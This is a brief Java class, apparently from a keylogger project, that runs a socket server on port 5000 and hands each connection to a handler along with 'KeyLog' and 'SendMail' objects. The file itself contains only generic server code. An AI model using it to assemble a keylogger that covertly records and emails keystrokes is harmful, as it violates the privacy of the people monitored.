package email;

import java.net.ServerSocket;
import java.net.Socket;

public class ServerThreading extends Thread {

  public KeyLog keylog;
  public static String status = "No notification";
  SendMail send;

  public ServerThreading(KeyLog keyLog, SendMail send) {
    this.keylog = keyLog;
    this.send = send;
  }

  public void run() {
    try {
      ServerSocket serverSocket = new ServerSocket(5000);
      System.out.println("Server is running...");
      boolean stop = false;
      while (!stop) {
        Socket socket = serverSocket.accept();
        ClientThreading clientSocket = new ClientThreading(
          socket,
          keylog,
          send
        );
        clientSocket.start();
      }
      serverSocket.close();
    } catch (Exception e) {
      System.out.println(e);
    }
  }
}